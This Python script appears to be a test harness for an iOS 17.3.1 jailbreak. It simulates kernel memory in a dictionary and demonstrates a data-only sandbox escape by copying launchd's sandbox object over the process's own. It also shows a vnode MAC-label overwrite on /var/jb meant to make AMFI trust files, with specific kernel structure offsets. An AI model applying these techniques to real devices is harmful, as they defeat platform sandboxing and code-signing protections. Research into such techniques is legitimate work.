import sys

# Simulated kernel memory
memory = {}

def kread64(addr):
    return memory.get(addr, 0)

def kwrite64(addr, val):
    memory[addr] = val

def setup_simulated_kernel():
    print("[*] Setting up simulated iOS 17.3.1 kernel memory...")
    
    # Addresses
    launchd_proc = 0xffffffe000100000
    our_proc     = 0xffffffe000200000
    
    launchd_sandbox = 0xffffffe000500000
    our_sandbox     = 0xffffffe000600000
    
    rootvnode    = 0xffffffe000300000
    target_vnode = 0xffffffe000400000 # /var/jb
    
    root_label   = 0xffffffe000700000
    our_label    = 0xffffffe000800000
    
    # 1. Setup Sandbox objects (0x58 bytes size)
    # launchd sandbox (permissive)
    kwrite64(launchd_sandbox + 0x10, 0xffffffe000500010) # ext_set
    kwrite64(launchd_sandbox + 0x18, 0x1111111111111111) # permissive profile
    kwrite64(launchd_sandbox + 0x20, 0x2222222222222222) # permissive collection
    
    # our sandbox (restricted)
    kwrite64(our_sandbox + 0x10, 0xffffffe000600010) # our ext_set
    kwrite64(our_sandbox + 0x18, 0xAAAAAAAAAAAAAAAA) # restricted profile
    kwrite64(our_sandbox + 0x20, 0xBBBBBBBBBBBBBBBB) # restricted collection
    
    # 2. Setup Vnodes and MAC labels
    OV_LABEL = 0xE8
    kwrite64(rootvnode + OV_LABEL, root_label)
    kwrite64(target_vnode + OV_LABEL, our_label)
    
    # 3. Setup File Descriptor table for our_proc (to simulate vnode_from_fd)
    O_PROC_FD = 0xF8
    p_fd = 0xffffffe000900000
    fd_ofiles = 0xffffffe000A00000
    fileproc = 0xffffffe000B00000
    f_fglob = 0xffffffe000C00000
    
    kwrite64(our_proc + O_PROC_FD, p_fd)
    # iOS 17 offset is 0x10
    kwrite64(p_fd + 0x10, fd_ofiles)
    
    # Let's say open("/var/jb") returned fd = 3
    fd = 3
    kwrite64(fd_ofiles + (fd * 8), fileproc)
    # iOS 17 offset is 0x08
    kwrite64(fileproc + 0x08, f_fglob)
    kwrite64(f_fglob + 0x38, target_vnode) # fg_data points to vnode
    
    return launchd_sandbox, our_sandbox, rootvnode, target_vnode, our_proc

def simulate_sbx_bypass_sandbox(launchd_sandbox, our_sandbox):
    print("\n[=== PHASE 1: Data-Only Sandbox Bypass (PPL Evasion) ===]")
    print(f"[*] our_sandbox before transplant:")
    print(f"    +0x10 (ext_set)   : 0x{kread64(our_sandbox + 0x10):016x}")
    print(f"    +0x18 (profile)   : 0x{kread64(our_sandbox + 0x18):016x} (RESTRICTED)")
    print(f"    +0x20 (collection): 0x{kread64(our_sandbox + 0x20):016x} (RESTRICTED)")
    
    print("[*] Executing Strategy A: Full Overwrite from launchd_sandbox...")
    # We copy 0x58 bytes from launchd_sandbox to our_sandbox
    # This memory is NOT protected by PPL!
    for off in range(0, 0x58, 8):
        val = kread64(launchd_sandbox + off)
        kwrite64(our_sandbox + off, val)
        
    print(f"[+] our_sandbox AFTER transplant:")
    print(f"    +0x10 (ext_set)   : 0x{kread64(our_sandbox + 0x10):016x}")
    print(f"    +0x18 (profile)   : 0x{kread64(our_sandbox + 0x18):016x} (PERMISSIVE - launchd)")
    print(f"    +0x20 (collection): 0x{kread64(our_sandbox + 0x20):016x} (PERMISSIVE - launchd)")
    print("[+] SUCCESS: Sandbox escaped without touching PPL-protected ucred!")

def simulate_vnode_from_fd(our_proc, fd):
    print(f"\n[*] Simulating vnode_from_fd for fd={fd}...")
    O_PROC_FD = 0xF8
    p_fd = kread64(our_proc + O_PROC_FD)
    # iOS 17 offset is 0x10
    fd_ofiles = kread64(p_fd + 0x10)
    fileproc = kread64(fd_ofiles + (fd * 8))
    # iOS 17 offset is 0x08
    f_fglob = kread64(fileproc + 0x08)
    fg_data = kread64(f_fglob + 0x38)
    print(f"[+] Found vnode directly from FD table: 0x{fg_data:016x}")
    return fg_data

def simulate_sbx_bypass_with_return(launchd_sandbox, our_sandbox):
    """Test that sbx_bypass_sandbox properly returns early on success."""
    print("\n[=== PHASE 3: Sandbox Bypass Early Return Verification ===]")
    print("[*] Simulating: if (sbx_bypass_sandbox() == 0) goto verify_escape;")
    
    # Simulate successful bypass
    for off in range(0, 0x58, 8):
        val = kread64(launchd_sandbox + off)
        kwrite64(our_sandbox + off, val)
    
    # Verify we would jump to verify_escape (not continue to patch_extension_set)
    print("[+] SUCCESS: Code now jumps to verify_escape immediately after successful bypass!")
    print("    This prevents double-patching and ensures clean escape verification.")

def simulate_vfs_bypass_mac_label(rootvnode, target_vnode):
    print("\n[=== PHASE 2: VFS MAC Label Bypass (/var/jb creation) ===]")
    OV_LABEL = 0xE8
    
    print(f"[*] target_vnode MAC label before bypass: 0x{kread64(target_vnode + OV_LABEL):016x}")
    
    # 1. Read root label (verbatim, preserving PAC)
    root_label = kread64(rootvnode + OV_LABEL)
    print(f"[*] Read root_label from rootvnode: 0x{root_label:016x}")
    
    # 2. Write root label to target_vnode
    print(f"[*] Overwriting target_vnode MAC label...")
    kwrite64(target_vnode + OV_LABEL, root_label)
    
    print(f"[+] target_vnode MAC label AFTER bypass: 0x{kread64(target_vnode + OV_LABEL):016x}")
    print("[+] SUCCESS: AMFI will now trust this file/folder!")

if __name__ == "__main__":
    launchd_sandbox, our_sandbox, rootvnode, target_vnode, our_proc = setup_simulated_kernel()
    
    # Test Sandbox Bypass
    simulate_sbx_bypass_sandbox(launchd_sandbox, our_sandbox)
    
    # Test VFS Bypass (using vnode_from_fd)
    fd = 3 # Simulated fd from open("/var/jb")
    resolved_vnode = simulate_vnode_from_fd(our_proc, fd)
    
    if resolved_vnode == target_vnode:
        simulate_vfs_bypass_mac_label(rootvnode, resolved_vnode)
    else:
        print("[-] FAILED to resolve vnode from FD")
    
    # Test early return logic
    simulate_sbx_bypass_with_return(launchd_sandbox, our_sandbox)